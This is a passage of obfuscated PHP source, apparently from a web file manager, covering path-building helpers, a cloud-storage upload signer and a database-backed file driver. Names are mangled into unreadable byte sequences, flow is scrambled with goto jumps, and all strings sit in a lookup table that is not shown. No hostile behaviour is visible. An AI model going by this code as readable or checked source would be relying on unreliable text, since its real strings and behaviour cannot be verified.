$CçŠŠŒùòö); } goto AÆ—Ûß©‡ã; bÚ–øÖÃ°: } public static function sourceID($B¨ó˜·Š) { $a¯¬ã»àÍö =& $_SERVER[Å¸ş]; $FîÈµ¯İ÷ƒ = self::parse($B¨ó˜·Š); if ($FîÈµ¯İ÷ƒ[$a¯¬ã»àÍö[29]] !== self::KOD_SOURCE) { show_json(LNG($a¯¬ã»àÍö[1072]), !1); } return $FîÈµ¯İ÷ƒ[$a¯¬ã»àÍö[367]]; } public static function make($Aò‰š³à§) { if (!$Aò‰š³à§) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Aò‰š³à§)); } public static function makeShare($bõÖˆˆßß™, $Eƒª¥Ñö) { return self::makePath(self::KOD_SHARE_ITEM, $bõÖˆˆßß™, $Eƒª¥Ñö); } public static function makeFileTypePath($EŠ££²‡»®) { return self::makePath(self::KOD_USER_FILE_TYPE, $EŠ££²‡»®); } public static function makeFileTagPath($Cø‘Ìá¢§) { return self::makePath(self::KOD_USER_FILE_TAG, $Cø‘Ìá¢§); } public static function makePath($CÁ‘…Àˆº², $EÀ¤—Ùãì = '', $F‹°ŒÎµ— = '') { $F¦ó‰ÁÏĞ  =& $_SERVER[Å¸ş]; $Dˆ­»‹ÆÍ‰ = substr($CÁ‘…Àˆº², 1, -1); $fÈªÉ¡‹óà = $F¦ó‰ÁÏĞ [1073] . $Dˆ­»‹ÆÍ‰ . $F¦ó‰ÁÏĞ [1074] . $EÀ¤—Ùãì . $F¦ó‰ÁÏĞ [1075]; $fÈªÉ¡‹óà = $F‹°ŒÎµ— ? $fÈªÉ¡‹óà . $F‹°ŒÎµ— . $F¦ó‰ÁÏĞ [8] : $fÈªÉ¡‹óà; return $fÈªÉ¡‹óà; } public static function hashPath($D±Îµ‚ñ®ˆ) { $A¶××ÔÏßğ =& $_SERVER[Å¸ş]; $bİ›„°ÍºÔ = is_array($D±Îµ‚ñ®ˆ) ? $D±Îµ‚ñ®ˆ : IO::info($D±Îµ‚ñ®ˆ); $aìÍÀ£°•– = _get($bİ›„°ÍºÔ, $A¶××ÔÏßğ[1076], $A¶××ÔÏßğ[33]); if (!$aìÍÀ£°•–) { $aÌ¬öÑ«ªí = KodIO::parse($bİ›„°ÍºÔ[$A¶××ÔÏßğ[75]]); if (!$aÌ¬öÑ«ªí[$A¶××ÔÏßğ[29]]) { $aìÍÀ£°•– = IO::hashSimple($bİ›„°ÍºÔ[$A¶××ÔÏßğ[75]]); } } if (!$aìÍÀ£°•–) { $aìÍÀ£°•– = md5($bİ›„°ÍºÔ[$A¶××ÔÏßğ[75]] . $bİ›„°ÍºÔ[$A¶××ÔÏßğ[77]] . $bİ›„°ÍºÔ[$A¶××ÔÏßğ[107]]); } return $aìÍÀ£°•–; } public static function initSystemPath() { $cä·é—ÚÉ =& $_SERVER[Å¸ş]; if (defined($cä·é—ÚÉ[1077])) { return; } define($cä·é—ÚÉ[1077], self::systemPath($cä·é—ÚÉ[1078])); define($cä·é—ÚÉ[1079], self::systemPath($cä·é—ÚÉ[1080])); define($cä·é—ÚÉ[1081], self::systemPath($cä·é—ÚÉ[1082])); define($cä·é—ÚÉ[1083], self::systemPath($cä·é—ÚÉ[1084])); } private static function systemPath($aÈ¾„Ç¡¥á) { goto EÛÎÅ™†”; EÛÎÅ™†”: $f»›‘–ôÉ =& $_SERVER[Å¸ş]; $c…Ò—˜„» = $f»›‘–ôÉ[1085] . ucfirst($aÈ¾„Ç¡¥á); $C›«¶§Ññ = Model($f»›‘–ôÉ[1086])->get($c…Ò—˜„»); goto a†×õÃÔºÔ; a†×õÃÔºÔ: if ($C›«¶§Ññ) { return $C›«¶§Ññ; } if ($aÈ¾„Ç¡¥á == $f»›‘–ôÉ[1078]) { $C›«¶§Ññ = self::make(Model($f»›‘–ôÉ[755])->systemRootPathAdd($f»›‘–ôÉ[1087])); } else { $C›«¶§Ññ = self::systemPath($f»›‘–ôÉ[1078]); $CŞ˜Ššç = self::sourceID($C›«¶§Ññ); $C›«¶§Ññ = self::make(Model($f»›‘–ôÉ[755])->mkdir($CŞ˜Ššç, $aÈ¾„Ç¡¥á)); } Model($f»›‘–ôÉ[1086])->set($c…Ò—˜„», $C›«¶§Ññ); goto D„ãº­óÂĞ; D„ãº­óÂĞ: return $C›«¶§Ññ; goto B¢ø³èò…ß; B¢ø³èò…ß: } public static function systemFolder($fªàãÊÕ¬’) { $f…êùîŒ… = IO_PATH_SYSTEM_SOURCE . $fªàãÊÕ¬’; $d˜åñŸîËĞ = Cache::get($f…êùîŒ…); if (!$d˜åñŸîËĞ) { $AÇ‰²Ã»â = IO::infoFull($f…êùîŒ…); if (!$AÇ‰²Ã»â) { $d˜åñŸîËĞ = IO::mkdir($f…êùîŒ…, REPEAT_SKIP); } else { $d˜åñŸîËĞ = $AÇ‰²Ã»â[$_SERVER[Å¸ş][75]]; } Cache::set($f…êùîŒ…, $d˜åñŸîËĞ, 3600 * 10); } return $d˜åñŸîËĞ; } public static function defaultDriver() { return Model($_SERVER[Å¸ş][706])->defaultDriver(); } public static function defaultIO() { $E—»ëí¯ =& $_SERVER[Å¸ş]; $E°¤´‹âç½ = self::defaultDriver(); return $E—»ëí¯[1088] . $E°¤´‹âç½[$E—»ëí¯[367]] . $E—»ëí¯[1075]; } public static function defaultDriverInit() { static $e°é‹§½Ø = false; if ($e°é‹§½Ø) { return $e°é‹§½Ø; } $e°é‹§½Ø = IO::init(self::defaultIO()); return $e°é‹§½Ø; } public static function fileTypeList() { $aËÀÒèÀé… =& $_SERVER[Å¸ş]; $fáøºî²Üù = $GLOBALS[$aËÀÒèÀé…[6]][$aËÀÒèÀé…[1089]]; foreach ($fáøºî²Üù as $BÈ¸ÚÈ => $CšÜì¢´ñ¤) { $dä¾´ğÍÂ = $aËÀÒèÀé…[1090] . $BÈ¸ÚÈ; $AâĞ—¥Û½ = LNG($dä¾´ğÍÂ); if ($dä¾´ğÍÂ != $AâĞ—¥Û½) { $fáøºî²Üù[$BÈ¸ÚÈ][$aËÀÒèÀé…[28]] = $AâĞ—¥Û½; } } return $fáøºî²Üù; } public static function transferType($EÅĞø˜—ö•, $E£š¯°ùÊÔ) { goto Eîø÷Î°êÓ; Eîø÷Î°êÓ: $f–ë¼À¶Í =& $_SERVER[Å¸ş]; $Côµ…ÚŒò = self::driverType($EÅĞø˜—ö•); $Fè¾ÛÃœ‹å = self::driverType($E£š¯°ùÊÔ); goto f»ÍŞ™ëË¿; f»ÍŞ™ëË¿: if ($Côµ…ÚŒò[$f–ë¼À¶Í[29]] == $Fè¾ÛÃœ‹å[$f–ë¼À¶Í[29]] && $Côµ…ÚŒò[$f–ë¼À¶Í[1091]] == $Fè¾ÛÃœ‹å[$f–ë¼À¶Í[1091]]) { return $f–ë¼À¶Í[1092]; } if ($Côµ…ÚŒò[$f–ë¼À¶Í[29]] == $f–ë¼À¶Í[782] && $Fè¾ÛÃœ‹å[$f–ë¼À¶Í[29]] == $f–ë¼À¶Í[102]) { return $f–ë¼À¶Í[1038]; } if ($Côµ…ÚŒò[$f–ë¼À¶Í[29]] == $f–ë¼À¶Í[102] && $Fè¾ÛÃœ‹å[$f–ë¼À¶Í[29]] == $f–ë¼À¶Í[782]) { return $f–ë¼À¶Í[103]; } goto f‰¤¾Äáòâ; f‰¤¾Äáòâ: return $f–ë¼À¶Í[1093]; goto d÷£Š˜È£Ë; d÷£Š˜È£Ë: } public static function driverType($fßàï»¥—Ó) { goto fµîĞÏÜÔÌ; fµîĞÏÜÔÌ: $bó‘ÜòÙ¯Æ =& $_SERVER[Å¸ş]; $e»È³¡„ƒ = $fßàï»¥—Ó->path; $f‡“Š±åàß = str_replace($bó‘ÜòÙ¯Æ[1094], $bó‘ÜòÙ¯Æ[33], strtolower($fßàï»¥—Ó->getType())); goto DƒÑœæ«Ÿ‘; FÂ¸ ×­: return array($bó‘ÜòÙ¯Æ[29] => $bó‘ÜòÙ¯Æ[782], $bó‘ÜòÙ¯Æ[1091] => $fßàï»¥—Ó->pathDriver, $bó‘ÜòÙ¯Æ[75] => $e»È³¡„ƒ); goto DŒã¤…Ç¦™; DƒÑœæ«Ÿ‘: if ($f‡“Š±åàß == $bó‘ÜòÙ¯Æ[697] || $f‡“Š±åàß == $bó‘ÜòÙ¯Æ[1095] || $f‡“Š±åàß == $bó‘ÜòÙ¯Æ[1096]) { $fßàï»¥—Ó = self::defaultDriverInit(); } else { if ($f‡“Š±åàß == $bó‘ÜòÙ¯Æ[1046] || $f‡“Š±åàß == $bó‘ÜòÙ¯Æ[1097]) { $fßàï»¥—Ó = IO::init($fßàï»¥—Ó->pathParse[$bó‘ÜòÙ¯Æ[996]]); } } $f‡“Š±åàß = str_replace($bó‘ÜòÙ¯Æ[1094], $bó‘ÜòÙ¯Æ[33], strtolower($fßàï»¥—Ó->getType())); if ($f‡“Š±åàß == $bó‘ÜòÙ¯Æ[102]) { return array($bó‘ÜòÙ¯Æ[29] => $bó‘ÜòÙ¯Æ[102], $bó‘ÜòÙ¯Æ[1091] => $bó‘ÜòÙ¯Æ[33], $bó‘ÜòÙ¯Æ[75] => $e»È³¡„ƒ); } goto FÂ¸ ×­; DŒã¤…Ç¦™: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aœÉÍõööÌ) { parent::__construct($aœÉÍõööÌ); $this->signatureVersion($_SERVER[Å¸ş][200]); } public function uploadFormData($d¦›÷Šòê, $d‚˜‰»†ñ = 3600) { goto fšÛÕ­Úßí; dÕ±½•„ÑÃ: $e®œ²‰ÉÜŒ = array($Dç«Üº—¾ò[1100] => $c˜ô»Éˆš, $Dç«Üº—¾ò[1101] => array(array($Dç«Üº—¾ò[1102] => $EƒÔ¶é÷ôÔ), array($Dç«Üº—¾ò[1103] => $this->bucket), array($Dç«Üº—¾ò[1104], $Dç«Üº—¾ò[1105], $Dç«Üº—¾ò[33]), array($Dç«Üº—¾ò[1106] => $bââÜÅÆÃ), array($Dç«Üº—¾ò[1107] => $d÷â‡ÌÁè¬), array($Dç«Üº—¾ò[1108] => $this->accessKey), array($Dç«Üº—¾ò[1109] => $d«»…ªó¨))); $e®œ²‰ÉÜŒ = json_encode($e®œ²‰ÉÜŒ); $cƒğ­—Ñê‘ = hash_hmac($Dç«Üº—¾ò[218], $d«»…ªó¨, $this->secret); goto b»¯¶„Šî; e˜¼Â…‡¥Ï: $bââÜÅÆÃ = $Dç«Üº—¾ò[1098]; $c˜ô»Éˆš = gmdate($Dç«Üº—¾ò[1099], time() + $d‚˜‰»†ñ); $d«»…ªó¨ = (string) time() . $Dç«Üº—¾ò[67] . (string) (time() + $d‚˜‰»†ñ); goto dÕ±½•„ÑÃ; c¾¹„ÀÂº: return $BÒÅ¹›¢…; goto aÓ†É³“ó; b»¯¶„Šî: $aÖÑ›ù÷ = sha1($e®œ²‰ÉÜŒ); $FîÒÎÀÅé‘ = hash_hmac($Dç«Üº—¾ò[218], $aÖÑ›ù÷, $cƒğ­—Ñê‘); $BÒÅ¹›¢… = array($Dç«Üº—¾ò[1102] => $EƒÔ¶é÷ôÔ, $Dç«Üº—¾ò[1106] => $bââÜÅÆÃ, $Dç«Üº—¾ò[1110] => base64_encode($e®œ²‰ÉÜŒ), $Dç«Üº—¾ò[1107] => $d÷â‡ÌÁè¬, $Dç«Üº—¾ò[1108] => $this->accessKey, $Dç«Üº—¾ò[1111] => $d«»…ªó¨, $Dç«Üº—¾ò[1112] => $FîÒÎÀÅé‘, $Dç«Üº—¾ò[169] => $this->getHost()); goto c¾¹„ÀÂº; fšÛÕ­Úßí: $Dç«Üº—¾ò =& $_SERVER[Å¸ş]; $EƒÔ¶é÷ôÔ = $Dç«Üº—¾ò[185]; $d÷â‡ÌÁè¬ = $Dç«Üº—¾ò[218]; goto e˜¼Â…‡¥Ï; aÓ†É³“ó: } public function fileOutLink($CÀÀĞ´­Ô) { $b¿ÄŠŒÊ =& $_SERVER[Å¸ş]; if (substr($CÀÀĞ´­Ô, 0, 7) == $b¿ÄŠŒÊ[1113]) { $CÀÀĞ´­Ô = $b¿ÄŠŒÊ[1114] . substr($CÀÀĞ´­Ô, 7); } header($b¿ÄŠŒÊ[156] . $CÀÀĞ´­Ô); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($DóÔƒä­òœ) { $this->pathParse = $DóÔƒä­òœ; $this->model = Model($_SERVER[Å¸ş][1115]); } public function getPath($eš³Øãİáæ) { return trim($eš³Øãİáæ, $_SERVER[Å¸ş][8]); } public function pathFather($BŒèÜïæì¤) { $B¦ªâÕ×£¤ = $this->parse($BŒèÜïæì¤); $B¦ªâÕ×£¤ = $this->infoSimple($BŒèÜïæì¤); return $B¦ªâÕ×£¤ ? $B¦ªâÕ×£¤[$_SERVER[Å¸ş][463]] : !1; } public function getPathName($E…´²‰âá) { $c‚™Øğ„ëÙ = $this->infoSimple($E…´²‰âá); return $c‚™Øğ„ëÙ ? $c‚™Øğ„ëÙ[$_SERVER[Å¸ş][28]] : !1; } public function getPathOuter($aÔóÙ±Å¿ö) { if (!$aÔóÙ±Å¿ö) { return $aÔóÙ±Å¿ö; } $eÇ‡Òêîëõ = $this->parse($aÔóÙ±Å¿ö); return KodIO::make($eÇ‡Òêîëõ[$_SERVER[Å¸ş][367]]); } public function copyFolderFromIO($aù›ªŒõëŸ, $f²›É‚Úß†, $F¶Ä›“Ÿßò, $FÓòé¯ÕÎë, $e¼¯òã¹‘õ) { $EæùÈïŠ³ğ = $this->model->copyFolderFromIO($aù›ªŒõëŸ, $f²›É‚Úß†, $F¶Ä›“Ÿßò, $FÓòé¯ÕÎë, $e¼¯òã¹‘õ); return KodIO::make($EæùÈïŠ³ğ); } public function isParentOf($dĞçù²àÓ±, $A¯á™”·Æ®) { return $this->model->isParentOf($dĞçù²àÓ±, $A¯á™”·Æ®); } public function mkfile($dÇŞ•”•‹Œ, $cÁĞ²¥ƒ„Á = '', $E§áÚ¿’ÖÚ = REPEAT_RENAME) { $añ’ÉÄŠÉÂ =& $_SERVER[Å¸ş]; $e¨ö±Ï…º… = $this->parse($dÇŞ•”•‹Œ); $dÇŞ•”•‹Œ = $e¨ö±Ï…º…[$añ’ÉÄŠÉÂ[367]]; for ($bïÇš¸µ’ = 0; $bïÇš¸µ’ < count($e¨ö±Ï…º…[$añ’ÉÄŠÉÂ[1116]]); $bïÇš¸µ’++) { $Cæ³ƒÕØ· = $e¨ö±Ï…º…[$añ’ÉÄŠÉÂ[1116]][$bïÇš¸µ’]; if ($bïÇš¸µ’ == count($e¨ö±Ï…º…[$añ’ÉÄŠÉÂ[1116]]) - 1) { $dÇŞ•”•‹Œ = $this->model->mkfile($dÇŞ•”•‹Œ, $Cæ³ƒÕØ·, $cÁĞ²¥ƒ„Á, $E§áÚ¿’ÖÚ); break; } $dÇŞ•”•‹Œ = $this->model->mkdir($dÇŞ•”•‹Œ, $Cæ³ƒÕØ·, REPEAT_SKIP); } return $this->getPathOuter($dÇŞ•”•‹Œ); } public function mkdir($FàÜÎ¹Ş, $f¼îò½ã´ = REPEAT_SKIP) { $FÇŒ‡«—¬ =& $_SERVER[Å¸ş]; $B÷Îá—À‰ğ = $this->parse($FàÜÎ¹Ş); $FàÜÎ¹Ş = $B÷Îá—À‰ğ[$FÇŒ‡«—¬[367]]; for ($eº©†ÙŠá‘ = 0; $eº©†ÙŠá‘ < count($B÷Îá—À‰ğ[$FÇŒ‡«—¬[1116]]); $eº©†ÙŠá‘++) { $aòªÃ¶ŠĞ = $B÷Îá—À‰ğ[$FÇŒ‡«—¬[1116]][$eº©†ÙŠá‘]; $FàÜÎ¹Ş = $this->model->mkdir($FàÜÎ¹Ş, $aòªÃ¶ŠĞ, $f¼îò½ã´); } return $this->getPathOuter($FàÜÎ¹Ş); } public function copyFile($E»â•¶†Æ, $b„öÒîé„, $AÈöÑê = REPEAT_REPLACE) { $d®ª¯¥êÅß =& $_SERVER[Å¸ş]; $eƒ®¡ƒ¨ = $this->parse($b„öÒîé„); $bƒ‰¢ÍÓ = $this->model->copy($E»â•¶†Æ, $eƒ®¡ƒ¨[$d®ª¯¥êÅß[367]], $AÈöÑê, $eƒ®¡ƒ¨[$d®ª¯¥êÅß[75]]); return $bƒ‰¢ÍÓ ? $this->getPathOuter($bƒ‰¢ÍÓ) : !1; } public function moveFile($C¥¬ÙèÃ´Œ, $fçÅùˆ¥¶¹, $f›¹é†ÔÕÌ = REPEAT_REPLACE) { $c±Æ÷…ƒŒ =& $_SERVER[Å¸ş]; $f×°§Šî¯¯ = $this->parse($fçÅùˆ¥¶¹); $AŞ¡¦ğ¯³Ş = $this->model->move($C¥¬ÙèÃ´Œ, $f×°§Šî¯¯[$c±Æ÷…ƒŒ[367]], $f›¹é†ÔÕÌ, $f×°§Šî¯¯[$c±Æ÷…ƒŒ[75]]); return $AŞ¡¦ğ¯³Ş ? $this->getPathOuter($AŞ¡¦ğ¯³Ş) : !1; } public function copy($C²°†ö†Ş, $AÄÃ•ÓŒåÓ, $AŒËˆòİ“ = REPEAT_REPLACE) { $a³Áˆñà¢ = $this->parse($AÄÃ•ÓŒåÓ); $cÆËô‘’ = $this->model->copy($C²°†ö†Ş, $a³Áˆñà¢[$_SERVER[Å¸ş][367]], $AŒËˆòİ“); return $cÆËô‘’ ? $this->getPathOuter($cÆËô‘’) : !1; } public function moveSameAllow() { } public function move($aˆ—îæ®Å­, $Fš»Ù¸ß, $CØ»¥ÉÛ˜Ô = REPEAT_REPLACE) { $fÊÂ‡Ş†™¦ = $this->parse($Fš»Ù¸ß); $Dˆ¥•‡çÍ = $this->model->move($aˆ—îæ®Å­, $fÊÂ‡Ş†™¦[$_SERVER[Å¸ş][367]], $CØ»¥ÉÛ˜Ô); return $Dˆ¥•‡çÍ ? $this->getPathOuter($Dˆ¥•‡çÍ) : !1; } public function remove($b¾î¯éºÍÈ, $A‚ÅË¡òè = true) { return $this->model->remove($b¾î¯éºÍÈ, $A‚ÅË¡òè); } public function rename($D˜ŒÑ¸ñ˜, $C¡›‰Š‰ó…) { $DÑêñ±µŠµ = $this->model->rename($D˜ŒÑ¸ñ˜, $C¡›‰Š‰ó…); return $DÑêñ±µŠµ ? $this->getPathOuter($D˜ŒÑ¸ñ˜) : $DÑêñ±µŠµ; } public function size($B¨¶·¢ë„â) { $FÂñŠÍ…Óã = $this->infoSimple($B¨¶·¢ë„â); return $FÂñŠÍ…Óã ? $FÂñŠÍ…Óã[$_SERVER[Å¸ş][77]] : 0; } public function infoSimple($EÂÍí–­§¬) { return $this->model->sourceInfo($EÂÍí–­§¬); } public function info($E­Æ¶äáï›) { return $this->infoParse($E­Æ¶äáï›); } public function infoAuth($aëŞç¨¡é) { return $this->infoParse($aëŞç¨¡é, !1, !0); } public function infoWithChildren($eÌ¼î‘áä) { return $this->infoParse($eÌ¼î‘áä, !0); } protected function infoParse($Cáë…ñÉïğ, $AÀïÎÏÁƒí = false, $f£Ÿ±Ó»¹ = false) { if (!$AÀïÎÏÁƒí) { return $this->model->pathInfo($Cáë…ñÉïğ, $f£Ÿ±Ó»¹); } return $this->model->pathInfoMore($Cáë…ñÉïğ); } public function infoFull($B¥¨Ú«®÷) { $eĞÍŞ‘—¸ =& $_SERVER[Å¸ş]; $D¥ªˆ¹Š  = explode($eĞÍŞ‘—¸[8], $B¥¨Ú«®÷); $B¯Ğ±”¢‚Ö = implode($eĞÍŞ‘—¸[8], array_splice($D¥ªˆ¹Š , 1)); return $this->model->pathInfoByPath($D¥ªˆ¹Š [0], $B¯Ğ±”¢‚Ö); } public function hashSimple($aÙ¯ì³ÃØ§) { $b—ˆ¶íîÒ÷ =& $_SERVER[Å¸ş]; $c±®Ñ¾ÕÅ· = $this->infoWithChildren($aÙ¯ì³ÃØ§); return $c±®Ñ¾ÕÅ·[$b—ˆ¶íîÒ÷[162]][$b—ˆ¶íîÒ÷[164]]; } public function hashMd5($CÀÊ¸âµßù) { $BË¸§–Ü‰÷ =& $_SERVER[Å¸ş]; $BˆÂ£ÌÊ“§ = $this->infoWithChildren($CÀÊ¸âµßù); return $BˆÂ£ÌÊ“§[$BË¸§–Ü‰÷[162]][$BË¸§–Ü‰÷[163]]; } public function exist($F–ÛØëä¤ø) { $f¤ Óö¶‡ =& $_SERVER[Å¸ş]; $b×¡Ÿô¶Ë = $this->parse($F–ÛØëä¤ø); if (!$b×¡Ÿô¶Ë[$f¤ Óö¶‡[75]]) { return $this->isFile($F–ÛØëä¤ø) || $this->isFolder($F–ÛØëä¤ø); } $f«¶İİÁ©í = array($f¤ Óö¶‡[368] => $b×¡Ÿô¶Ë[$f¤ Óö¶‡[367]], $f¤ Óö¶‡[28] => $b×¡Ÿô¶Ë[$f¤ Óö¶‡[75]]); $d÷—»Ì¥×ù = $this->model->where($f«¶İİÁ©í)->find(); return $d÷—»Ì¥×ù ? !0 : !1; } public function isFile($Cùä÷•áÈ) { $E‰¬”¨¸§£ =& $_SERVER[Å¸ş]; $CÛÁ›‹Ğø = $this->infoSimple($Cùä÷•áÈ); return $CÛÁ›‹Ğø && $CÛÁ›‹Ğø[$E‰¬”¨¸§£[370]] == $E‰¬”¨¸§£[83] ? !1 : !0; } public function isFolder($EˆğƒÜô”) { $B˜Ü®ÓŠ¿‚ =& $_SERVER[Å¸ş]; $d×ø ¯Îøô = $this->infoSimple($EˆğƒÜô”); return $d×ø ¯Îøô && $d×ø ¯Îøô[$B˜Ü®ÓŠ¿‚[370]] == $B˜Ü®ÓŠ¿‚[83] ? !0 : !1; } public function listPath($AŠö‚Êå©, $CòöĞ¤¾‚À = false) { $eœÑ…Å–‰¶ =& $_SERVER[Å¸ş]; if ($AŠö‚Êå© == $eœÑ…Å–‰¶[33]) { return !1; } $FãÃ­†ÇØ = array($eœÑ…Å–‰¶[368] => $AŠö‚Êå©); if ($CòöĞ¤¾‚À) { return $this->model->listSource($FãÃ­†ÇØ, -1); } return $this->model->listSource($FãÃ­†ÇØ); } public function has($fàÇæø‘çÙ, $aæï¯œ‡²à = false, $Aëà¯êÃÙ = null) { $dœÏ Ú›¤‹ =& $_SERVER[Å¸ş]; $FÉ÷ÍÁñ² = $this->infoWithChildren($fàÇæø‘çÙ); if ($aæï¯œ‡²à) { return array($dœÏ Ú›¤‹[192] => $FÉ÷ÍÁñ²[$dœÏ Ú›¤‹[192]], $dœÏ Ú›¤‹[191] => $FÉ÷ÍÁñ²[$dœÏ Ú›¤‹[191]]); } return $Aëà¯êÃÙ ? $FÉ÷ÍÁñ²[$dœÏ Ú›¤‹[192]] : $FÉ÷ÍÁñ²[$dœÏ Ú›¤‹[191]]; } public function listAll($Eà‚ˆÙ“„) { $AÎ‡¦Í¹´… = IO::info($this->pathParse[$_SERVER[Å¸ş][75]]); if (!$AÎ‡¦Í¹´…) { return array(); } return $this->model->listAll($Eà‚ˆÙ“„); } public function getContent($F”Õö„äö) { return $this->model->getContent($F”Õö„äö); } public function setContent($eˆ¤«’šÇê, $C«Ã†ÍÃ = '') { return $this->model->setContent($eˆ¤«’šÇê, $C«Ã†ÍÃ); } public function fileSubstr($AÃ˜§òÜªâ, $fÁŸÚ´Á†, $CÖ˜³Éò®°) { return $this->model->fileSubstr($AÃ˜§òÜªâ, $fÁŸÚ´Á†, $CÖ˜³Éò®°); } public function download($C…÷áĞ˜©, $b½çö¸·ğ¹ = '') { $açë¾ĞÑìØ = get_path_father($b½çö¸·ğ¹); $cÕ‘‚ã¦±ö = get_path_this($b½çö¸·ğ¹); $d¯íš È»ƒ = $this->model->fileInfoGet($C…÷áĞ˜©); $a½Ñº¼œÙ¶ = IO::copy($d¯íš È»ƒ[$_SERVER[Å¸ş][75]], $açë¾ĞÑìØ, !1, $cÕ‘‚ã¦±ö); return $a½Ñº¼œÙ¶; } public function setModifyTime($cíá–ß•»Ú, $D„ñŠ = '') { $this->model->metaSet($cíá–ß•»Ú, $_SERVER[Å¸ş][1117], $D„ñŠ); } public function upload($eÑŸ“õ¬±, $CÃ×´Îî¨§, $DÒªàÙƒ…ù = false, $AÆì¥…Ô‹˜ = REPEAT_REPLACE) { $E‹ÁöÀÜ«³ =& $_SERVER[Å¸ş]; $F°óœÁçÑ = $this->parse($eÑŸ“õ¬±); $F°Æ‰Šë·ˆ = $this->model->addFile($F°óœÁçÑ[$E‹ÁöÀÜ«³[367]], $CÃ×´Îî¨§, $F°óœÁçÑ[$E‹ÁöÀÜ«³[75]], $DÒªàÙƒ…ù, $AÆì¥…Ô‹˜); return $this->getPathOuter($F°Æ‰Šë·ˆ); } public function uploadFileByID($Fí¦à Ó¸, $bäÊ…Ã–™÷, $DÀ»¨Ü³) { $f¨ÑØµÑš =& $_SERVER[Å¸ş]; $Eêä–¡ëğ = $this->parse($Fí¦à Ó¸); $DˆóÆËº = $this->model->addFileByFileID($Eêä–¡ëğ[$f¨ÑØµÑš[367]], $bäÊ…Ã–™÷, $Eêä–¡ëğ[$f¨ÑØµÑš[75]], $DÀ»¨Ü³); return $this->getPathOuter($DˆóÆËº); } public function addFileByRemote($FÔä¦ãóŠ…, $fµ‘³³¯â, $Cà’ßã„¢î = array(), $AÎ…Ö‡È¬Í = '', $bÖ¬Å„±í) { $A¢¿™ ½ËÆ =& $_SERVER[Å¸ş]; $cíÎ¯Âôã = $this->parse($FÔä¦ãóŠ…); $AÎ…Ö‡È¬Í = empty($AÎ…Ö‡È¬Í) ? $cíÎ¯Âôã[$A¢¿™ ½ËÆ[75]] : $AÎ…Ö‡È¬Í; $A‰¼§Úù²• = $this->model->addFileByRemote($cíÎ¯Âôã[$A¢¿™ ½ËÆ[367]], $fµ‘³³¯â, $AÎ…Ö‡È¬Í, $Cà’ßã„¢î, $bÖ¬Å„±í); return $this->getPathOuter($A‰¼§Úù²•); } public function uploadLink($côĞÖÂğš, $F•÷×²¥¾ = 0) { $bªËÎÁø”‘ =& $_SERVER[Å¸ş]; $AÍÄÑ›¹¯‰ = $this->parse($côĞÖÂğš); $côĞÖÂğš = Model($bªËÎÁø”‘[546])->createFileName($AÍÄÑ›¹¯‰[$bªËÎÁø”‘[75]]); $cƒãîßä‡Ì = IO::uploadLink($côĞÖÂğš, $F•÷×²¥¾); return $cƒãîßä‡Ì; } public function fileNameAuto($Fç¤«ê“ñõ, $Bí´©¸¬Œ, $cå´®ò™ÌÁ = REPEAT_REPLACE, $DÎ–„İÚĞÚ = false) { return $this->model->fileNameAuto($Fç¤«ê“ñõ, $Bí´©¸¬Œ, $cå´®ò™ÌÁ, $DÎ–„İÚĞÚ); } public function fileNameExist($Dò¥Æ«²¥, $Aˆ¿”ˆ„ï) { return $this->model->fileNameExist($Dò¥Æ«²¥, $Aˆ¿”ˆ„ï); } protected function _fileOut($e³Ÿ´ëÕ¸Ì, $fç’¥ƒ†è¬ = false, $eÅšçÉ—ì™ = false, $a¶­¦œ…¸ = '', $Fƒˆ˜Œ›˜ = false) { goto C¸‹’ô³È; C¸‹’ô³È: $d¶Ğ‹°÷Š‹ =& $_SERVER[Å¸ş]; $cäìïÂ‚øâ = $this->model->sourceInfo($e³Ÿ´ëÕ¸Ì); if ($cäìïÂ‚øâ[$d¶Ğ‹°÷Š‹[370]] == $d¶Ğ‹°÷Š‹[83]) { header($d¶Ğ‹°÷Š‹[1118]); die; } goto BùƒŸÂÕù; FÏ§İ²¥ëİ: if ($Fƒˆ˜Œ›˜) { return IO::fileOutServer($c™×Àíá¦[$d¶Ğ‹°÷Š‹[75]], $fç’¥ƒ†è¬, $eäĞ‹³óŞ, $a¶­¦œ…¸); } IO::fileOut($c™×Àíá¦[$d¶Ğ‹°÷Š‹[75]], $fç’¥ƒ†è¬, $eäĞ‹³óŞ, $a¶­¦œ…¸); goto d­ÃÎäÅ›ï; BùƒŸÂÕù: $c™×Àíá¦ = $this->model->fileInfoGet($e³Ÿ´ëÕ¸Ì); $a¶­¦œ…¸ = $c™×Àíá¦[$d¶Ğ‹°÷Š‹[163]] ? $c™×Àíá¦[$d¶Ğ‹°÷Š‹[163]] : $a¶­¦œ…¸; $eäĞ‹³óŞ = isset($GLOBALS[$d¶Ğ‹°÷Š‹[1119]]) ? $GLOBALS[$d¶Ğ‹°÷Š‹[1119]] : $cäìïÂ‚øâ[$d¶Ğ‹°÷Š‹[28]]; goto FÏ§İ²¥ëİ; d­ÃÎäÅ›ï: } public function fileOut($B¶÷¸ºÔ§£, $Aï±’Ï¼ƒ˜ = false, $Fôäßç»‡Ÿ = false, $BÊ¨¼ß‡­ = '') { $this->_fileOut($B¶÷¸ºÔ§£, $Aï±’Ï¼ƒ˜, $Fôäßç»‡Ÿ, $BÊ¨¼ß‡­); } public function fileOutServer($a°õ‚î¢«, $cå‚„ÂÇ = false, $Dñ„…×±Í¡ = false, $Bù»î²Íæ™ = '') { $this->_fileOut($a°õ‚î¢«, $cå‚„ÂÇ, $Dñ„…×±Í¡, $Bù»î²Íæ™, !0); } protected function _fileOutImage($e¦°¦†Ìë‘, $Eê¬áŒ’Ö½ = 250) { $C’ëŒ¦¾Ö« =& $_SERVER[Å¸ş]; $fÆÌ×÷ÆÌÔ = $this->model->sourceInfo($e¦°¦†Ìë‘); if ($fÆÌ×÷ÆÌÔ[$C’ëŒ¦¾Ö«[370]] == $C’ëŒ¦¾Ö«[83]) { show_json($C’ëŒ¦¾Ö«[1120] . $e¦°¦†Ìë‘, !1); } $GLOBALS[$C’ëŒ¦¾Ö«[1119]] = $fÆÌ×÷ÆÌÔ[$C’ëŒ¦¾Ö«[28]]; $få…ƒó„…½ = $this->model->fileInfoGet($e¦°¦†Ìë‘); IO::fileOutImage($få…ƒó„…½[$C’ëŒ¦¾Ö«[75]], $Eê¬áŒ’Ö½); } public function fileOutImage($c—¼ğ§„ò, $AÂÌ®ï§È© = 250) { 